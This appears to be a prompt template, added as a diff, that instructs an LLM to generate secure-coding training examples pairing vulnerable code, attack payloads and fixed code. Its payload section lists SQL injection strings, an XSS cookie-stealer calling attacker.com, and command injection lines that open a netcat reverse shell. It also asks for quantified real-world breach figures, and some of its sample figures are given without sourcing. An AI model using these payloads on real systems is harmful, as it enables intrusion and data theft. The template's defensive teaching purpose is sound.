@@ -1,0 +1,462 @@
+You are an expert security researcher creating high-quality secure code training examples for the SecureCode v2.0 dataset.
+
+# CRITICAL REQUIREMENTS
+
+## 1. Example Structure (MUST follow exactly)
+
+Each example MUST have this JSON structure:
+
+```json
+{{
+  "id": "{subcategory}-{{number}}",
+  "metadata": {{
+    "lang": "{language}",
+    "category": "{category}",
+    "subcategory": "{subcategory}",
+    "technique": "{{specific_technique}}",
+    "owasp_2021": "{owasp_mapping}",
+    "cwe": "{{cwe_id}}",
+    "severity": "CRITICAL" | "HIGH" | "MEDIUM",
+    "complexity": "basic" | "moderate" | "advanced",
+    "created": "{{today's date}}",
+    "validated": false
+  }},
+  "context": {{
+    "real_world_incident": "{{specific CVE or breach name}}",
+    "impact": "{{quantified impact: dollar amounts, user counts, data records}}",
+    "attack_vector": "{{how the attack works}}",
+    "business_impact": "{{real consequences}}",
+    "cve": "{{CVE-YYYY-NNNNN}}" (if applicable),
+    "year": {{2022-2025}}
+  }},
+  "conversations": [
+    {{
+      "turn": 1,
+      "from": "human",
+      "value": "{{basic question}}"
+    }},
+    {{
+      "turn": 2,
+      "from": "assistant",
+      "value": "{{vulnerable code + secure code + explanations}}"
+    }},
+    {{
+      "turn": 3,
+      "from": "human",
+      "value": "{{advanced follow-up question}}"
+    }},
+    {{
+      "turn": 4,
+      "from": "assistant",
+      "value": "{{advanced pattern + production best practices}}"
+    }}
+  ],
+  "validation": {{
+    "syntax_check": "not_tested",
+    "security_review": "not_reviewed",
+    "code_execution": "not_tested",
+    "encoding_check": "not_tested",
+    "duplication_check": "not_tested",
+    "reviewed_by": "automated-generator",
+    "review_date": "{{today's date}}",
+    "issues": []
+  }}
+}}
+```
+
+## 2. Conversation Turn Requirements
+
+### Turn 1 (Human): Basic Question
+- Short, natural question (1-2 sentences)
+- Beginner-friendly
+- Focuses on "how do I..." or "is this safe?"
+- Examples:
+  - "How do I query a database safely?"
+  - "Is this authentication code secure?"
+  - "Can you show me how to validate user input?"
+
+### Turn 2 (Assistant): Vulnerable → Secure Pattern
+
+**Format EXACTLY like this:**
+
+```
+{{explanation of why this is dangerous}}
+
+**VULNERABLE CODE**:
+
+```{language}
+{{complete vulnerable code example - 15-30 lines}}
+```
+
+**Attack Payload** (if applicable):
+```{{language or sql}}
+{{specific attack payload that exploits the vulnerability}}
+```
+
+**Why This Is Dangerous**:
+- {{reason 1}}
+- {{reason 2}}
+- {{reason 3}}
+
+**SECURE VERSION**:
+
+```{language}
+{{complete secure code example - 20-40 lines}}
+```
+
+**Key Security Controls**:
+- {{control 1 with explanation}}
+- {{control 2 with explanation}}
+- {{control 3 with explanation}}
+```
+
+### Turn 3 (Human): Advanced Question
+- Builds on Turn 1
+- Asks about edge cases, advanced scenarios, or production concerns
+- Examples:
+  - "What about dynamic WHERE clauses?"
+  - "How do I handle multiple authentication methods?"
+  - "What if I need to allow some HTML tags?"
+
+### Turn 4 (Assistant): Production-Ready Pattern
+
+**Format:**
+
+```
+{{explanation of production best practices}}
+
+**PRODUCTION PATTERN**:
+
+```{language}
+{{complete production-ready code - 30-50 lines}}
+{{include: error handling, logging, monitoring, defense in depth}}
+```
+
+**Defense in Depth Layers**:
+1. {{layer 1 with code example}}
+2. {{layer 2 with code example}}
+3. {{layer 3 with code example}}
+
+**Additional Protections**:
+- {{protection 1}}
+- {{protection 2}}
+- {{protection 3}}
+```
+
+## 3. Code Quality Requirements
+
+### CRITICAL: All code MUST be syntactically valid
+
+**Language-Specific Rules:**
+
+**Python:**
+- Include all imports at the top
+- Use proper indentation (4 spaces)
+- Include class declarations where needed
+- Use type hints for production code
+- Example:
+```python
+from flask import Flask, request, abort
+from werkzeug.security import check_password_hash
+import re
+
+app = Flask(__name__)
+
+@app.route('/api/data')
+def get_data():
+    # Implementation
+    pass
+```
+
+**Java:**
+- Always include complete class declarations
+- Include all imports
+- Use proper package structure
+- Include necessary constants (DB_URL, etc.)
+- Example:
+```java
+import java.sql.*;
+import javax.servlet.http.*;
+
+public class UserService {{
+    private static final String DB_URL = "jdbc:postgresql://localhost/db";
+    private static final String USER = "dbuser";
+    private static final String PASS = "password";
+
+    public User getUser(int id) throws SQLException {{
+        // Implementation
+    }}
+}}
+```
+
+**JavaScript/Node.js:**
+- Include require/import statements
+- Use const/let appropriately
+- Include complete Express routes or React components
+- Example:
+```javascript
+const express = require('express');
+const {{ body, validationResult }} = require('express-validator');
+
+const app = express();
+
+app.post('/api/login',
+  body('username').isLength({{ min: 3 }}),
+  (req, res) => {{
+    // Implementation
+  }}
+);
+```
+
+**PHP:**
+- Include <?php tags
+- Use proper PDO or mysqli patterns
+- Include all necessary classes/functions
+- Example:
+```php
+<?php
+require_once 'config.php';
+
+class UserController {{
+    private $pdo;
+
+    public function __construct($pdo) {{
+        $this->pdo = $pdo;
+    }}
+
+    public function getUser($id) {{
+        // Implementation
+    }}
+}}
+```
+
+**Go:**
+- Include package declaration
+- Include all imports
+- Use proper error handling
+- Example:
+```go
+package main
+
+import (
+    "database/sql"
+    "net/http"
+    _ "github.com/lib/pq"
+)
+
+func getUser(w http.ResponseWriter, r *http.Request) {{
+    // Implementation
+}}
+```
+
+**C#:**
+- Include using statements
+- Include complete class declarations
+- Use proper namespace
+- Example:
+```csharp
+using System;
+using System.Data.SqlClient;
+using Microsoft.AspNetCore.Mvc;
+
+namespace MyApp.Controllers
+{{
+    public class UserController : ControllerBase
+    {{
+        [HttpGet("api/users/{{id}}")]
+        public IActionResult GetUser(int id)
+        {{
+            // Implementation
+        }}
+    }}
+}}
+```
+
+### Code Block Language Tags
+
+**CRITICAL: Use correct language tags**
+
+- Use `sql` for SQL payloads, NOT `python` or `javascript`
+- Use `bash` for shell commands
+- Use `text` for generic output/data
+- Examples:
+```sql
+-- SQL injection payload
+' OR '1'='1'--
+```
+
+```bash
+# Shell command
+curl -X POST http://api.example.com/login
+```
+
+## 4. Real-World Context Requirements
+
+**CRITICAL: Use REAL CVEs and incidents from 2022-2025**
+
+**Good Examples:**
+- "2023 MOVEit Transfer SQL injection (CVE-2023-34362): $9.2B damages, 2,100+ orgs"
+- "2024 Okta authentication bypass (CVE-2024-5217): 134 organizations compromised"
+- "2023 LastPass breach: AES-256 master passwords exposed via client-side vulnerability"
+
+**Bad Examples:**
+- Generic "SQL injection attack in 2023"
+- Made-up CVE numbers
+- Vague "millions of users affected"
+
+**If no CVE exists for the technique:** Use realistic scenario:
+- "Common in e-commerce platforms processing 10K+ daily transactions"
+- "Affects Spring Boot applications using default configurations"
+- "Observed in 2024 red team assessments of Fortune 500 companies"
+
+## 5. Attack Payload Requirements
+
+**Include specific, working attack payloads**
+
+**SQL Injection:**
+```sql
+' UNION SELECT username, password, email FROM users--
+' OR '1'='1'--
+'; DROP TABLE users; --
+```
+
+**XSS:**
+```html
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+<img src=x onerror="alert(document.domain)">
+```
+
+**Command Injection:**
+```bash
+; cat /etc/passwd
+| nc attacker.com 4444 -e /bin/bash
+`curl https://attacker.com/$(whoami)`
+```
+
+**Explain what each payload does**
+
+## 6. Security Fix Requirements
+
+**ALL secure versions MUST include:**
+
+1. **Primary defense** (parameterized queries, input validation, etc.)
+2. **Why it works** (explain the security mechanism)
+3. **Defense in depth** (multiple layers)
+4. **Error handling** (fail securely)
+5. **Logging** (for monitoring)
+
+**Example:**
+```python
+# PRIMARY DEFENSE: Parameterized query
+sql = "SELECT * FROM users WHERE id = %s"
+cursor.execute(sql, (user_id,))  # Safe: query structure is fixed
+
+# DEFENSE IN DEPTH: Input validation
+if not user_id.isdigit():
+    abort(400, "Invalid user ID")
+
+# ERROR HANDLING: Fail securely
+try:
+    result = cursor.fetchone()
+except Exception as e:
+    app.logger.error(f"Database error: {{e}}")
+    abort(500, "Internal server error")  # Don't leak details
+```
+
+## 7. Production Best Practices
+
+**Turn 4 MUST include:**
+
+- Environment-specific configuration (dev vs prod)
+- Rate limiting
+- Monitoring/alerting
+- Audit logging
+- Defense in depth
+- Graceful degradation
+- Security headers (for web apps)
+
+**Example:**
+```python
+# Production configuration
+if app.config['ENV'] == 'production':
+    app.config['SESSION_COOKIE_SECURE'] = True
+    app.config['SESSION_COOKIE_HTTPONLY'] = True
+    app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
+
+# Rate limiting
+limiter = Limiter(app, default_limits=["100 per hour"])
+
+@app.route('/api/login')
+@limiter.limit("5 per minute")
+def login():
+    # Implementation with audit logging
+    app.logger.info(f"Login attempt from {{request.remote_addr}}")
+```
+
+## 8. Common Validation Failures to Avoid
+
+**Syntax Errors:**
+- ❌ Missing class declarations in Java
+- ❌ Missing imports
+- ❌ SQL payloads in Python code blocks (use ```sql instead)
+- ❌ Unbalanced quotes/braces
+
+**Schema Violations:**
+- ❌ Using "pending" in validation field (use "not_tested")
+- ❌ Missing required metadata fields
+- ❌ Invalid severity values
+
+**Quality Issues:**
+- ❌ Incomplete code snippets (must be runnable)
+- ❌ Generic "Company X was breached" context
+- ❌ Missing explanations of WHY code is vulnerable/secure
+- ❌ Single-layer defenses (must have defense in depth)
+
+## 9. Output Format
+
+**Return ONLY valid JSON**
+
+- No markdown formatting around the JSON
+- No explanatory text
+- No comments in the JSON
+- Properly escaped strings
+- Valid UTF-8 encoding
+
+**Test your JSON before returning:**
+- All quotes properly escaped
+- All braces balanced
+- No trailing commas
+- Valid date formats
+
+## 10. Validation Checklist
+
+Before returning your example, verify:
+
+- [ ] All 4 conversation turns present
+- [ ] All code blocks have proper language tags
+- [ ] All code is syntactically valid for the language
+- [ ] Real CVE or realistic context included
+- [ ] Attack payloads shown and explained
+- [ ] Vulnerable code clearly marked
+- [ ] Secure code includes multiple defenses
+- [ ] Production patterns include monitoring/logging
+- [ ] All metadata fields populated correctly
+- [ ] JSON is valid (no syntax errors)
+
+---
+
+# GENERATION TASK
+
+Generate a secure code training example with the following specifications:
+
+**Category**: {category}
+**Subcategory**: {subcategory}
+**Language**: {language}
+**Technique**: {technique}
+**OWASP Mapping**: {owasp_mapping}
+**CWE**: {cwe}
+**Example ID**: {example_id}
+
+{additional_context}
+
+Return ONLY the JSON object. No other text.
